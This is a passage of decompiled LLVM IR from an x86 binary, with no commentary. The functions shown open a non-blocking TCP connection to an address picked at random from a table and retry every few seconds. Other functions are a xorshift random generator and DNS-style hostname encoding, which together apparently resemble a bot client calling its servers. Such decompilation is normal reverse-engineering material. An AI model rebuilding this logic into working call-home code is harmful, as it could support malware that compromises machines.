  %v2_804e34a = inttoptr i32 %v0_804e151 to i32*
  store i32 12, i32* %v2_804e34a, align 4
  %v2_804e34c = call i32 @function_8051220(i8 0)
  store i32 %v2_804e34c, i32* %eax.global-to-local, align 4
  %v0_804e351 = load i32, i32* @esp, align 4
  %v1_804e351 = inttoptr i32 %v0_804e351 to i32*
  store i32 13, i32* %v1_804e351, align 4
  %v2_804e358 = call i32 @function_8051220(i8 0)
  store i32 %v2_804e358, i32* %eax.global-to-local, align 4
  %v0_804e35d = load i32, i32* @esp, align 4
  %v1_804e35d = inttoptr i32 %v0_804e35d to i32*
  store i32 14, i32* %v1_804e35d, align 4
  %v2_804e364 = call i32 @function_8051220(i8 0)
  store i32 %v2_804e364, i32* %eax.global-to-local, align 4
  %v0_804e369 = load i32, i32* @esp, align 4
  %v1_804e369 = inttoptr i32 %v0_804e369 to i32*
  store i32 15, i32* %v1_804e369, align 4
  %v2_804e370 = call i32 @function_8051220(i8 0)
  store i32 %v2_804e370, i32* %eax.global-to-local, align 4
  %v0_804e375 = load i32, i32* @esp, align 4
  %v1_804e375 = inttoptr i32 %v0_804e375 to i32*
  store i32 16, i32* %v1_804e375, align 4
  %v2_804e37c = call i32 @function_8051220(i8 0)
  store i32 %v2_804e37c, i32* %eax.global-to-local, align 4
  %v0_804e381 = load i32, i32* @esp, align 4
  %v1_804e381 = inttoptr i32 %v0_804e381 to i32*
  %v2_804e381 = load i32, i32* %v1_804e381, align 4
  store i32 %v2_804e381, i32* %eax.global-to-local, align 4
  %v1_804e382 = add i32 %v0_804e381, 56
  %v2_804e382 = inttoptr i32 %v1_804e382 to i32*
  %v3_804e382 = load i32, i32* %v2_804e382, align 4
  store i32 %v3_804e382, i32* @edi, align 4
  store i32 %v3_804e382, i32* %v1_804e381, align 4
  %v1_804e387 = call i32 @function_8052191(i32 0)
  store i32 %v1_804e387, i32* @eax, align 4
  %v0_804e38c = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e2cc

; uselistorder directives
  uselistorder i32 %v1_804e338, { 1, 0 }
  uselistorder i32 %v1_804e250, { 1, 0 }
  uselistorder i32 %v6_804e25e, { 2, 0, 1 }
  uselistorder i32 %v0_804e341128, { 1, 0 }
  uselistorder i32 %v2_804e23f, { 1, 0 }
  uselistorder i32 %v3_804e238, { 1, 0, 2 }
  uselistorder i32 %v0_804e13c51, { 2, 1, 0 }
  uselistorder i32 %v0_804e247, { 0, 4, 5, 6, 3, 2, 1 }
  uselistorder i32 %v6_804e224, { 0, 2, 1 }
  uselistorder i32 %v0_804e328, { 1, 0 }
  uselistorder i32 %v0_804e213, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e20a, { 1, 0 }
  uselistorder i32 %v1_804e20a, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_804e20a, { 1, 2, 3, 4, 7, 0, 8, 5, 6, 9 }
  uselistorder i32 %v0_804e200, { 1, 0 }
  uselistorder i32 %v6_804e1ec, { 1, 0 }
  uselistorder i32 %v0_804e318, { 1, 0 }
  uselistorder i32 %v0_804e1df, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e1d6, { 1, 0 }
  uselistorder i32 %v0_804e1d6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804e1cc, { 1, 0 }
  uselistorder i32 %v6_804e1b8, { 1, 0 }
  uselistorder i32 %v0_804e308, { 1, 0 }
  uselistorder i32 %v0_804e1ab, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e1a2, { 1, 0 }
  uselistorder i32 %v0_804e1a2, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_804e198, { 1, 0 }
  uselistorder i32 %v6_804e184, { 1, 0 }
  uselistorder i32 %v0_804e270, { 1, 0 }
  uselistorder i32 %v0_804e171, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v2_804e168, { 1, 0 }
  uselistorder i32 %v0_804e168, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_804e13c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_804e077, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e054, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v3_804e04f, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804dfea, { 1, 0 }
  uselistorder i32 %v0_804dfe1, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_804dfea.pre, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_804dfc3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_804df8a, { 0, 2, 1 }
  uselistorder i32 %v4_804df45, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804deea, { 2, 1, 0 }
  uselistorder i32 %v0_804dea4, { 1, 0, 2 }
  uselistorder i32 %v1_804de51, { 1, 0 }
  uselistorder i32 %v1_804de4e, { 2, 1, 0 }
  uselistorder i32 %v0_804de4e, { 1, 0, 2 }
  uselistorder i32 %v2_804de4c, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804de68, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804de1d, { 1, 0 }
  uselistorder i32 %v1_804de1a, { 1, 0, 2 }
  uselistorder i32 %v0_804de0d, { 1, 0, 2, 3 }
  uselistorder i32 %v0_804de08, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804de00, { 1, 0 }
  uselistorder i32 %v2_804dd9e, { 1, 0 }
  uselistorder i32 %v3_804dd38, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804dcf6, { 1, 0, 2 }
  uselistorder i32 %v2_804dce2, { 3, 2, 4, 0, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 %v1_804dca5, { 0, 2, 1 }
  uselistorder i32 %v3_804dc67, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804dc13, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 124, 125, 126, 127, 128, 129, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 130, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123 }
  uselistorder i32 8424, { 1, 0 }
  uselistorder i32 ()* @function_80524e4, { 2, 1, 0 }
  uselistorder i32 ()* @function_8051f60, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_8051ee0, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 19, 20, 21, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 8264, { 0, 2, 1 }
  uselistorder i32 8328, { 0, 1, 3, 2 }
  uselistorder i32 ()* @function_8052645, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @function_8052554, { 2, 1, 0 }
  uselistorder i32 4095, { 1, 0 }
  uselistorder i32 (i8*, i32)* @function_8051c10, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 27, 28, 29, 30, 26, 31, 32, 33, 34, 58, 59, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 60, 61, 62, 63 }
  uselistorder i8 7, { 3, 4, 5, 6, 7, 1, 2, 0 }
  uselistorder label %dec_label_pc_804e2cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804e27a, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804e25a, { 1, 0 }
  uselistorder label %dec_label_pc_804e238, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e220, { 1, 0 }
  uselistorder label %dec_label_pc_804e200, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e1e8, { 1, 0 }
  uselistorder label %dec_label_pc_804e1cc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e1b4, { 1, 0 }
  uselistorder label %dec_label_pc_804e198, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e180, { 1, 0 }
  uselistorder label %dec_label_pc_804e13c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804e077, { 1, 0 }
  uselistorder label %dec_label_pc_804e06b, { 1, 0 }
  uselistorder label %dec_label_pc_804dfe8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dfad, { 1, 0 }
  uselistorder label %dec_label_pc_804de00, { 3, 4, 1, 0, 5, 6, 2, 7 }
  uselistorder label %dec_label_pc_804dd95, { 1, 0 }
  uselistorder label %dec_label_pc_804dc94, { 1, 0 }
}

define i32 @function_804e3a0() local_unnamed_addr {
dec_label_pc_804e3a0:
  store i32 134538480, i32* @global_var_80567d4.24, align 4
  %v0_804e3aa = load i32, i32* @eax, align 4
  ret i32 %v0_804e3aa
}

define i32 @function_804e3b0() local_unnamed_addr {
dec_label_pc_804e3b0:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_804e3c3 = call i32 @function_8052985(i32 2, i32 1, i32 0)
  store i32 %v3_804e3c3, i32* @global_var_80567cc.25, align 4
  %v10_804e3d2 = icmp eq i32 %v3_804e3c3, -1
  br i1 %v10_804e3d2, label %dec_label_pc_804e470, label %dec_label_pc_804e3db

dec_label_pc_804e3db:                             ; preds = %dec_label_pc_804e3b0
  %v2_804e3e0 = ptrtoint i32* %stack_var_-12 to i32
  %v5_804e3ea = call i32 @function_805294a(i32 %v3_804e3c3, i32 1, i32 2, i32 %v2_804e3e0, i32 4)
  %v0_804e3f2 = load i32, i32* @global_var_80567cc.25, align 4
  %v3_804e3fc = call i32 @function_80520cd(i32 %v0_804e3f2, i32 3, i32 0)
  %v12_804e404 = or i32 %v3_804e3fc, 2048
  %v0_804e408 = load i32, i32* @global_var_80567cc.25, align 4
  %v3_804e410 = call i32 @function_80520cd(i32 %v0_804e408, i32 4, i32 %v12_804e404)
  %v0_804e41d = load i8, i8* @global_var_80567d8.26, align 8
  %v1_804e41d = icmp eq i8 %v0_804e41d, 0
  br i1 %v1_804e41d, label %dec_label_pc_804e476, label %dec_label_pc_804e426

dec_label_pc_804e426:                             ; preds = %dec_label_pc_804e3db, %dec_label_pc_804e476
  store i32 2, i32* %stack_var_-28, align 4
  %v1_804e438 = call i32 @function_80526c9(i32 2)
  %v2_804e43d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v1_804e438, i32* @ebx, align 4
  %v1_804e443 = inttoptr i32 %v1_804e438 to i32*
  store i32 0, i32* %v1_804e443, align 4
  %v0_804e44a = load i32, i32* @global_var_80567cc.25, align 4
  %v4_804e453 = call i32 @function_805277f(i32 %v0_804e44a, i32 %v2_804e43d, i32 16, i32 %v1_804e438)
  %v8_804e45b = icmp eq i32 %v4_804e453, -1
  br i1 %v8_804e45b, label %dec_label_pc_804e480, label %dec_label_pc_804e45e

dec_label_pc_804e45e:                             ; preds = %dec_label_pc_804e426
  %v0_804e45e = load i32, i32* @global_var_80567cc.25, align 4
  %v2_804e468 = call i32 @function_805283b(i32 %v0_804e45e, i32 1)
  br label %dec_label_pc_804e470

dec_label_pc_804e470:                             ; preds = %dec_label_pc_804e3b0, %dec_label_pc_804e45e
  %v0_804e475 = phi i32 [ -1, %dec_label_pc_804e3b0 ], [ %v2_804e468, %dec_label_pc_804e45e ]
  ret i32 %v0_804e475

dec_label_pc_804e476:                             ; preds = %dec_label_pc_804e3db
  br label %dec_label_pc_804e426

dec_label_pc_804e480:                             ; preds = %dec_label_pc_804e426
  %v0_804e480 = load i32, i32* @ebx, align 4
  %v1_804e480 = inttoptr i32 %v0_804e480 to i32*
  %v2_804e480 = load i32, i32* %v1_804e480, align 4
  %v11_804e480 = icmp eq i32 %v2_804e480, 99
  br i1 %v11_804e480, label %dec_label_pc_804e4de, label %dec_label_pc_804e485

dec_label_pc_804e485:                             ; preds = %dec_label_pc_804e480, %dec_label_pc_804e4de
  store i32 2, i32* %stack_var_-28, align 4
  %v0_804e49f = load i32, i32* @global_var_80567cc.25, align 4
  store i32 %v0_804e49f, i32* @esi, align 4
  %v3_804e4a6 = call i32 @function_80527aa(i32 %v0_804e49f, i32 %v2_804e43d, i32 16)
  %v1_804e4b2 = call i32 @function_8053d40(i32 5)
  store i32 5, i32* @ebx, align 4
  %v0_804e4b8 = load i32, i32* @global_var_80567cc.25, align 4
  %v1_804e4bf = call i32 @function_8052191(i32 %v0_804e4b8)
  %v1_804e4cb = call i32 @function_804d5e0(i32 58811)
  %v0_804e4d0 = call i32 @function_804e3b0()
  ret i32 %v0_804e4d0

dec_label_pc_804e4de:                             ; preds = %dec_label_pc_804e480
  store i8 0, i8* @global_var_80567d8.26, align 8
  br label %dec_label_pc_804e485

; uselistorder directives
  uselistorder i32 %v3_804e3c3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i8* @global_var_80567d8.26, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_805294a, { 1, 0 }
  uselistorder label %dec_label_pc_804e485, { 1, 0 }
  uselistorder label %dec_label_pc_804e470, { 1, 0 }
  uselistorder label %dec_label_pc_804e426, { 1, 0 }
}

define i32 @function_804e4f0() local_unnamed_addr {
dec_label_pc_804e4f0:
  %stack_var_-12 = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp4, i32* %stack_var_-12, align 4
  %stack_var_-28 = alloca i8*, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804e4f7 = call i32 @function_80512a0(i8 3)
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v4_804e502 = call i32 @function_80511f0(i32 3, i32* null)
  %v4_804e507 = inttoptr i32 %v4_804e502 to i8*
  store i8* %v4_804e507, i8** %stack_var_-28, align 4
  %v3_804e50a = call i32 @function_804f2f0(i8* %v4_804e507)
  store i32 %v3_804e50a, i32* @esi, align 4
  store i8* inttoptr (i32 3 to i8*), i8** %stack_var_-28, align 4
  %v3_804e518 = call i32 @function_8051220(i8 3)
  %v2_804e520 = icmp eq i32 %v3_804e50a, 0
  br i1 %v2_804e520, label %dec_label_pc_804e576, label %dec_label_pc_804e524

dec_label_pc_804e524:                             ; preds = %dec_label_pc_804e4f0
  %v1_804e50f = inttoptr i32 %v3_804e50a to i8*
  %v2_804e524 = add i32 %v3_804e50a, 4
  %v3_804e524 = inttoptr i32 %v2_804e524 to i32*
  %v4_804e524 = load i32, i32* %v3_804e524, align 4
  store i32 %v4_804e524, i32* @ebx, align 4
  %v0_804e527 = load i8*, i8** %stack_var_-28, align 4
  %v1_804e527 = ptrtoint i8* %v0_804e527 to i32
  %v2_804e527 = call i32 @function_804f020(i32 %v1_804e527)
  %v3_804e527 = sext i32 %v2_804e527 to i64
  %v3_804e531 = load i8, i8* %v1_804e50f, align 1
  %v8_804e537 = zext i8 %v3_804e531 to i64
  %v11_804e537 = urem i64 %v3_804e527, %v8_804e537
  %v12_804e537 = trunc i64 %v11_804e537 to i32
  %v0_804e539 = load i32, i32* @ebx, align 4
  %v2_804e539 = mul nuw nsw i32 %v12_804e537, 4
  %v3_804e539 = add i32 %v2_804e539, %v0_804e539
  %v4_804e539 = inttoptr i32 %v3_804e539 to i32*
  %v5_804e539 = load i32, i32* %v4_804e539, align 4
  %tmp10 = bitcast i8** %stack_var_-28 to i32*
  store i32 %v3_804e50a, i32* %tmp10, align 4
  store i32 %v5_804e539, i32* @global_var_805692c.28, align 4
  %v2_804e542 = call i32 @function_804f2b0(i32 %v3_804e50a)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v3_804e54e = call i32 @function_80512a0(i8 4)
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  %v4_804e559 = call i32 @function_80511f0(i32 4, i32* null)
  %v5_804e559 = inttoptr i32 %v4_804e559 to i16*
  %v3_804e55e = load i16, i16* %v5_804e559, align 2
  store i8* inttoptr (i32 4 to i8*), i8** %stack_var_-28, align 4
  store i16 %v3_804e55e, i16* bitcast (i32* @global_var_805692a.29 to i16*), align 4
  %v3_804e56e = call i32 @function_8051220(i8 4)
  %v2_804e576.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804e576

dec_label_pc_804e576:                             ; preds = %dec_label_pc_804e4f0, %dec_label_pc_804e524
  %v2_804e576 = phi i32 [ %tmp4, %dec_label_pc_804e4f0 ], [ %v2_804e576.pre, %dec_label_pc_804e524 ]
  ret i32 %v2_804e576

; uselistorder directives
  uselistorder i32 %v3_804e50a, { 2, 1, 0, 5, 3, 4 }
  uselistorder i8** %stack_var_-28, { 7, 6, 5, 0, 8, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_804e576, { 1, 0 }
}

define i32 @function_804f020(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f020:
  %v0_804f020 = load i32, i32* @global_var_80568a8.30, align 8
  %v0_804f028 = load i32, i32* @global_var_80568b4.31, align 4
  %v2_804f02e = mul i32 %v0_804f020, 2048
  %v2_804f033 = udiv i32 %v0_804f028, 524288
  store i32 %v2_804f033, i32* @ecx, align 4
  %v2_804f036 = xor i32 %v2_804f02e, %v0_804f020
  %v0_804f038 = load i32, i32* @global_var_80568ac.32, align 4
  store i32 %v0_804f038, i32* @global_var_80568a8.30, align 8
  %v0_804f042 = load i32, i32* @global_var_80568b0.33, align 16
  store i32 %v0_804f042, i32* @global_var_80568ac.32, align 4
  store i32 %v0_804f028, i32* @global_var_80568b0.33, align 16
  %v2_804f054 = xor i32 %v2_804f033, %v0_804f028
  %v2_804f056 = udiv i32 %v2_804f036, 256
  %v2_804f059 = xor i32 %v2_804f056, %v2_804f036
  %v2_804f05b = xor i32 %v2_804f059, %v2_804f054
  store i32 %v2_804f05b, i32* @global_var_80568b4.31, align 4
  ret i32 %v2_804f05b

; uselistorder directives
  uselistorder i32 %v2_804f036, { 1, 0 }
  uselistorder i32 %v2_804f033, { 1, 0 }
  uselistorder i32 %v0_804f028, { 1, 2, 0 }
  uselistorder i32 %v0_804f020, { 1, 0 }
}

define i32 @function_804f2b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804f2b0:
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %v0_804f2b0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804f2b8 = icmp eq i32 %arg1, 0
  br i1 %v1_804f2b8, label %dec_label_pc_804f2b0.dec_label_pc_804f2e0_crit_edge, label %dec_label_pc_804f2bc

dec_label_pc_804f2b0.dec_label_pc_804f2e0_crit_edge: ; preds = %dec_label_pc_804f2b0
  br label %dec_label_pc_804f2e0

dec_label_pc_804f2bc:                             ; preds = %dec_label_pc_804f2b0
  %v1_804f2bc = add i32 %arg1, 4
  %v2_804f2bc = inttoptr i32 %v1_804f2bc to i32*
  %v3_804f2bc = load i32, i32* %v2_804f2bc, align 4
  %v1_804f2bf = icmp eq i32 %v3_804f2bc, 0
  br i1 %v1_804f2bf, label %dec_label_pc_804f2cf, label %dec_label_pc_804f2c3

dec_label_pc_804f2c3:                             ; preds = %dec_label_pc_804f2bc
  %v1_804f2c7 = call i32 @function_80538e9(i32 %v3_804f2bc)
  br label %dec_label_pc_804f2cf

dec_label_pc_804f2cf:                             ; preds = %dec_label_pc_804f2bc, %dec_label_pc_804f2c3
  store i32 %v0_804f2b0, i32* @ebx, align 4
  %v1_804f2d6 = call i32 @function_80538e9(i32 %arg1)
  %v2_804f2e0.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804f2e0

dec_label_pc_804f2e0:                             ; preds = %dec_label_pc_804f2b0.dec_label_pc_804f2e0_crit_edge, %dec_label_pc_804f2cf
  %v2_804f2e0 = phi i32 [ %tmp12, %dec_label_pc_804f2b0.dec_label_pc_804f2e0_crit_edge ], [ %v2_804f2e0.pre, %dec_label_pc_804f2cf ]
  store i32 %v0_804f2b0, i32* @ebx, align 4
  ret i32 %v2_804f2e0

; uselistorder directives
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804f2e0, { 1, 0 }
  uselistorder label %dec_label_pc_804f2cf, { 1, 0 }
}

define i32 @function_804f2f0(i8* %arg1) local_unnamed_addr {
dec_label_pc_804f2f0:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-2207 = alloca i32, align 4
  %stack_var_-2208 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v4_804f2fc = ptrtoint i8* %arg1 to i32
  store i32 %v4_804f2fc, i32* @ebx, align 4
  %v4_804f307 = call i32 @function_8053298(i64 1, i32 8)
  %v2_804f310 = ptrtoint i32* %stack_var_-2208 to i32
  store i32 %v2_804f310, i32* %eax.global-to-local, align 4
  %tmp102 = bitcast i32* %stack_var_-2208 to i8*
  %v0_804f31b = load i32, i32* @ebx, align 4
  %v4_804f31b = inttoptr i32 %v0_804f31b to i8*
  %v3_804f31e = call i32 @function_8051bf0(i8* %v4_804f31b)
  %v2_804f323 = ptrtoint i32* %stack_var_-2207 to i32
  store i32 %v2_804f323, i32* %ecx.global-to-local, align 4
  store i32 %v2_804f310, i32* %edi.global-to-local, align 4
  %v1_804f32e = add i32 %v3_804f31e, 1
  store i32 %v1_804f32e, i32* %eax.global-to-local, align 4
  %tmp103 = icmp slt i32 %v1_804f32e, 1
  br i1 %tmp103, label %dec_label_pc_804f35a, label %dec_label_pc_804f342.lr.ph

dec_label_pc_804f342.lr.ph:                       ; preds = %dec_label_pc_804f2f0
  %v0_804f342.pre = load i32, i32* @ebx, align 4
  %v4_804f342.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804f342

dec_label_pc_804f334:                             ; preds = %dec_label_pc_804f349
  %v3_804f334 = inttoptr i32 %v2_804f334 to i8*
  store i8 %v2_804f342, i8* %v3_804f334, align 1
  %v0_804f336 = load i32, i32* @esi, align 4
  %v1_804f336 = add i32 %v0_804f336, 1
  store i32 %v1_804f336, i32* @esi, align 4
  %v0_804f337 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f337 = add i32 %v0_804f337, 1
  store i32 %v1_804f337, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804f33a

dec_label_pc_804f33a:                             ; preds = %dec_label_pc_804f34d, %dec_label_pc_804f334
  %v0_804f33c = phi i32 [ %v1_804f353, %dec_label_pc_804f34d ], [ %v1_804f337, %dec_label_pc_804f334 ]
  %v0_804f33a = load i32, i32* @ebx, align 4
  %v1_804f33a = add i32 %v0_804f33a, 1
  store i32 %v1_804f33a, i32* @ebx, align 4
  %v0_804f33b = load i32, i32* %eax.global-to-local, align 4
  %v1_804f33b = add i32 %v0_804f33b, -1
  store i32 %v1_804f33b, i32* %eax.global-to-local, align 4
  store i32 %v0_804f33c, i32* %ecx.global-to-local, align 4
  %tmp104 = icmp slt i32 %v1_804f33b, 1
  br i1 %tmp104, label %dec_label_pc_804f33e.dec_label_pc_804f35a_crit_edge, label %dec_label_pc_804f342

dec_label_pc_804f342:                             ; preds = %dec_label_pc_804f342.lr.ph, %dec_label_pc_804f33a
  %v2_804f334 = phi i32 [ %v2_804f323, %dec_label_pc_804f342.lr.ph ], [ %v0_804f33c, %dec_label_pc_804f33a ]
  %v4_804f342 = phi i32 [ %v4_804f342.pre, %dec_label_pc_804f342.lr.ph ], [ %v0_804f33c, %dec_label_pc_804f33a ]
  %v0_804f342 = phi i32 [ %v0_804f342.pre, %dec_label_pc_804f342.lr.ph ], [ %v1_804f33a, %dec_label_pc_804f33a ]
  %v1_804f342 = inttoptr i32 %v0_804f342 to i8*
  %v2_804f342 = load i8, i8* %v1_804f342, align 1
  %v3_804f342 = zext i8 %v2_804f342 to i32
  %v5_804f342 = and i32 %v4_804f342, -256
  %v6_804f342 = or i32 %v3_804f342, %v5_804f342
  store i32 %v6_804f342, i32* %edx.global-to-local, align 4
  %v10_804f344 = icmp eq i8 %v2_804f342, 46
  br i1 %v10_804f344, label %dec_label_pc_804f34d, label %dec_label_pc_804f349

dec_label_pc_804f349:                             ; preds = %dec_label_pc_804f342
  %v4_804f349 = icmp eq i8 %v2_804f342, 0
  %v1_804f34b = icmp eq i1 %v4_804f349, false
  br i1 %v1_804f34b, label %dec_label_pc_804f334, label %dec_label_pc_804f34d

dec_label_pc_804f34d:                             ; preds = %dec_label_pc_804f349, %dec_label_pc_804f342
  %v0_804f34d = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v1_804f351 = trunc i32 %v0_804f34d to i8
  %v2_804f351 = load i32, i32* %edi.global-to-local, align 4
  %v3_804f351 = inttoptr i32 %v2_804f351 to i8*
  store i8 %v1_804f351, i8* %v3_804f351, align 1
  %v0_804f353 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f353 = add i32 %v0_804f353, 1
  store i32 %v1_804f353, i32* %edx.global-to-local, align 4
  store i32 %v0_804f353, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804f33a

dec_label_pc_804f33e.dec_label_pc_804f35a_crit_edge: ; preds = %dec_label_pc_804f33a
  br label %dec_label_pc_804f35a

dec_label_pc_804f35a:                             ; preds = %dec_label_pc_804f33e.dec_label_pc_804f35a_crit_edge, %dec_label_pc_804f2f0
  %v0_804f35d = phi i32 [ %v0_804f33c, %dec_label_pc_804f33e.dec_label_pc_804f35a_crit_edge ], [ %v2_804f323, %dec_label_pc_804f2f0 ]
  %v1_804f35d = inttoptr i32 %v0_804f35d to i8*
  store i8 0, i8* %v1_804f35d, align 1
  store i32 %v2_804f310, i32* %eax.global-to-local, align 4
  %v3_804f365 = call i32 @function_8051bf0(i8* %tmp102)
  store i32 0, i32* %stack_var_-44, align 4
  %v2_804f379 = add i32 %v3_804f365, %v2_804f310
  store i32 %v2_804f379, i32* @edi, align 4
  %v1_804f39d = add i32 %v2_804f379, 1
  store i32 %v1_804f39d, i32* @ebx, align 4
  store i32 %v2_804f310, i32* %eax.global-to-local, align 4
  %v3_804f3a5 = call i32 @function_8051bf0(i8* %tmp102)
  %v1_804f3aa = add i32 %v3_804f3a5, 17
  store i32 %v1_804f3aa, i32* %eax.global-to-local, align 4
  %v1_804f3b1 = call i32 @function_804f020(i32 %v1_804f3aa)
  %v2_804f3bf = udiv i32 %v1_804f3b1, 65535
  store i32 %v2_804f3bf, i32* %edx.global-to-local, align 4
  %v2_804f3c979 = add i32 %v2_804f3bf, %v1_804f3b1
  store i32 %v2_804f3c979, i32* @esi, align 4
  store i32 8, i32* @eax, align 4
  store i32 -1, i32* %ebp.global-to-local, align 4
  %v2_804f3d9 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_804f3d9, i32* %ecx.global-to-local, align 4
  %v3_804f3e1 = call i32 @function_8051c80(i32 %v2_804f3d9, i32 16)
  store i32 %v3_804f3e1, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v0_804f429 = load i32, i32* @edi, align 4
  %v1_804f429 = add i32 %v0_804f429, 1
  %v2_804f429 = inttoptr i32 %v1_804f429 to i16*
  store i16 256, i16* %v2_804f429, align 2
  %v0_804f432 = load i32, i32* @ebx, align 4
  %v1_804f432 = add i32 %v0_804f432, 2
  %v2_804f432 = inttoptr i32 %v1_804f432 to i16*
  store i16 256, i16* %v2_804f432, align 2
  %v0_804f438 = load i32, i32* %ebp.global-to-local, align 4
  %v10_804f438 = icmp eq i32 %v0_804f438, -1
  br i1 %v10_804f438, label %dec_label_pc_804f44c.preheader, label %dec_label_pc_804f440

dec_label_pc_804f440.loopexit:                    ; preds = %dec_label_pc_804f565
  %v0_804f443.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_804f440

dec_label_pc_804f440:                             ; preds = %dec_label_pc_804f440.loopexit, %dec_label_pc_804f35a
  %v0_804f443 = phi i32 [ %v0_804f443.pre, %dec_label_pc_804f440.loopexit ], [ %v0_804f438, %dec_label_pc_804f35a ]
  %v0_804f440 = load i32, i32* @esp, align 4
  %v2_804f443 = add i32 %v0_804f440, -16
  %v3_804f443 = inttoptr i32 %v2_804f443 to i32*
  store i32 %v0_804f443, i32* %v3_804f443, align 4
  %v1_804f444 = call i32 @function_8052191(i32 1)
  store i32 %v1_804f444, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f44c.preheader

dec_label_pc_804f44c.preheader:                   ; preds = %dec_label_pc_804f440, %dec_label_pc_804f35a
  br label %dec_label_pc_804f44c

dec_label_pc_804f44c:                             ; preds = %dec_label_pc_804f44c.preheader, %dec_label_pc_804f565
  %v0_804f44c = load i32, i32* @ebx, align 4
  %v1_804f44c = load i32, i32* @esp, align 4
  %v2_804f44c = add i32 %v1_804f44c, -4
  %v3_804f44c = inttoptr i32 %v2_804f44c to i32*
  store i32 %v0_804f44c, i32* %v3_804f44c, align 4
